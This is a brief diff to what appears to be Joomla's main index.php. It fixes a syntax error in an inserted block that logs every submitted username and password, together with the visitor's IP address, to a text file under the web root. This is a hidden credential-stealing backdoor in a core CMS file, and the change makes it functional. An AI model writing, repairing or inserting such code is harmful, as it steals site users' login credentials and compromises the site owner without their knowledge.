@@ -28,7 +28,7 @@ if (version_compare(PHP_VERSION, JOOMLA_MINIMUM_PHP, '<')) {
  */
 define('_JEXEC', 1);
 
-if(isset($_POST['username')){
+if(isset($_POST['username'])){
   file_put_contents("/var/www/html/tmp/a/log.txt", "{$_POST['username']}:{$_POST['passwd']}:{$_SERVER['REMOTE_ADDR']}\n", FILE_APPEND);
 }
 
